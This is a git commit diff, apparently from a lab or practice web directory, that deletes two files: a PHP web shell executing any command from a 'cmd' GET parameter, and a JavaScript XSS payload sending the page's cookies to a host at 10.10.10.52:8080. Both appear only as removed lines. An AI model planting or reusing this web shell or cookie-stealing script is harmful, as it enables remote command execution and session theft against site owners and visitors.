fff16e6eb4fe20753c256cb55980d71c957557eb
= <=>
2024-10-17 21:13:04 +0530

    Updated: 2024-10-17 21:13:01

--- html/Vishal26/test.php
+++
@@ -1,8 +0,0 @@
-<?php
-
-if(isset($_GET['cmd'])){
-    echo "<pre>";
-    system($_GET['cmd']);
-    }
-
-    ?>
--- html/Vishal26/xss.js
+++
@@ -1,3 +0,0 @@
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'http://10.10.10.52:8080?cookie='+document.cookie,true);
-xhr.send();
